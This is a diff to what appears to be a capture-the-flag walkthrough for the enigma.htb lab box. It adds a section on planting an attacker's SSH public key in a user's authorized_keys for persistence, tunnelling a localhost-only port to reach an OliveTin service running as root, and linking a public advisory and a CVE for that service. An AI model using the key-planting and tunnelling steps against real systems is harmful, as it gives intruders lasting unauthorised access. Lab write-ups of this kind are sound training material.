@@ -312,14 +312,40 @@ Since the cracked hash belongs to a user named <redacted in the zz_users table, 
 su <redacted>
 Password: <redacted>
 ```
-The login succeeds, giving us a shell as the local user haris.  
+The login succeeds, giving us a shell as the local user haris.   
 
+### Establishing Persistent Access
+To get a more stable foothold as <redacted> - and to enable VPN tunneling for accessing services bound to localhost (like the one we're about to find on port 1337) - we generate an SSH keypair on our attacking machine and drop the public key into the user's authorized_keys:  
+```
+Attacker Machine:
+ssh-keygen -t ed25519 -f enigma -C <redacted>@enigma
+cat enigma.pub
+ssh-ed25519 <redacted> <redacted>@enigma
+Target Machine:
+echo 'ssh-ed25519 <MyPUBkey> <redacted>@enigma' >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys
+```
+This gives us SSH access as <redacted>, which we'll use to set up an SSH tunnel (-L) and forward the locally-bound port 1337 to our machine, letting us reach internal-only services from outside the box.  
+### Investigating the Local-Only Port 1337  
+Going back to the earlier ss -tulnp output, port 1337 was bound to 127.0.0.1 only. We tunnel it to our attacking machine via SSH, e.g.:  
+``` ssh -i enigma -L 1337:127.0.0.1:1337 <redacted>@enigma.htb ```
+With the tunnel up, we can now reach it locally:  
+```
+curl -i http://localhost:1337/
+[...]
+<title>OliveTin</title>
+[...]
+```
+The service turns out to be OliveTin, a web UI for running predefined shell commands. We check what it's running as:  
+```
+ps aux | grep -i '[o]livetin'
+root        1510  0.0  0.5 1240144 22000 ?       Ssl  11:43   0:00 /usr/local/bin/OliveTin
+```
+It's running as root, which makes it an attractive privilege escalation target if we can find a way to interact with or exploit it.  
+### Searching for a Known Vulnerability  
+We look for public advisories or CVEs affecting OliveTin:  
 
-
-
-
-
-
+[GitHub Advisory - GHSA-49gm-hh7w-wfvf](https://github.com/advisories/GHSA-49gm-hh7w-wfvf)
+[NVD - CVE-2026-27626](https://nvd.nist.gov/vuln/detail/CVE-2026-27626)
 
 
 
